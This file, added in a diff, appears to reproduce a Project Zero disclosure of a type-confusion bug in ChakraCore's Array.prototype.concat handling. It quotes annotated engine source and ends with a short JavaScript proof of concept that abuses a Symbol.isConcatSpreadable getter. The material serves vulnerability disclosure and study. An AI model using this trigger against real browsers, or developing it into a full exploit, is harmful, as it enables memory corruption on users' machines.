@@ -1,0 +1,87 @@
+<!--
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1292
+
+Let's assume that the following method is called with "firstPromotedItemIsSpreadable = true", and "args" has two elements an array and an integer 0x1234 sequentially.
+In the first loop, "aItem" is an array, and "firstPromotedItemIsSpreadable" remains true because the condition for the fast path is satisfied. In the second loop, "aItem" is 0x1234 and not spreadable, but the code at (a) makes the "spreadable" variable true, thus it reaches (b) and a type confusion occurs.
+
+template<typename T>
+void JavascriptArray::ConcatArgs(RecyclableObject* pDestObj, TypeId* remoteTypeIds,
+    Js::Arguments& args, ScriptContext* scriptContext, uint start, uint startIdxDest,
+    BOOL firstPromotedItemIsSpreadable, BigIndex firstPromotedItemLength, bool spreadableCheckedAndTrue)
+{
+    JS_REENTRANCY_LOCK(jsReentLock, scriptContext->GetThreadContext());
+    JavascriptArray* pDestArray = nullptr;
+
+    if (JavascriptArray::Is(pDestObj))
+    {
+        pDestArray = JavascriptArray::FromVar(pDestObj);
+    }
+
+    T idxDest = startIdxDest;
+    for (uint idxArg = start; idxArg < args.Info.Count; idxArg++)
+    {
+        Var aItem = args[idxArg];
+        bool spreadable = spreadableCheckedAndTrue;
+        if (!spreadable && scriptContext->GetConfig()->IsES6IsConcatSpreadableEnabled())
+        {
+            // firstPromotedItemIsSpreadable is ONLY used to resume after a type promotion from uint32 to uint64
+            // we do this because calls to IsConcatSpreadable are observable (a big deal for proxies) and we don't
+            // want to do the work a second time as soon as we record the length we clear the flag.
+            JS_REENTRANT(jsReentLock, spreadable = firstPromotedItemIsSpreadable || JavascriptOperators::IsConcatSpreadable(aItem)); <<------------------------- (a)
+
+            if (!spreadable)
+            {
+                JS_REENTRANT(jsReentLock, JavascriptArray::SetConcatItem<T>(aItem, idxArg, pDestArray, pDestObj, idxDest, scriptContext));
+                ++idxDest;
+                continue;
+            }
+        }
+        else
+        {
+            spreadableCheckedAndTrue = false; // if it was `true`, reset after the first use
+        }
+
+        if (pDestArray && JavascriptArray::IsDirectAccessArray(aItem) && JavascriptArray::IsDirectAccessArray(pDestArray)
+            && BigIndex(idxDest + JavascriptArray::FromVar(aItem)->length).IsSmallIndex() && !JavascriptArray::FromVar(aItem)->IsFillFromPrototypes()) // Fast path
+        {
+            ...
+        }
+        else
+        {
+            // Flatten if other array or remote array (marked with TypeIds_Array)
+            if (DynamicObject::IsAnyArray(aItem) || remoteTypeIds[idxArg] == TypeIds_Array || spreadable)
+            {
+                <<-------------------------------------------------------------------------------------------------- (b)
+                //CONSIDER: enumerating remote array instead of walking all indices
+                BigIndex length;
+                if (firstPromotedItemIsSpreadable)
+                {
+                    firstPromotedItemIsSpreadable = false;
+                    length = firstPromotedItemLength;
+                }
+                else
+                {
+                    JS_REENTRANT(jsReentLock, length = OP_GetLength(aItem, scriptContext));
+                }
+                ...
+                RecyclableObject* itemObject = RecyclableObject::FromVar(aItem); <<----------------------- TYPE CONFUSION
+                ...
+            }
+            ...
+        }
+        ...
+    }
+}
+
+PoC:
+-->
+
+let a = [0];
+let b = [0];
+b.__defineGetter__(Symbol.isConcatSpreadable, () => {
+    b[0] = 1.2;
+    return true;
+});
+
+let res = a.concat(b, 0x1234);
+print(res);
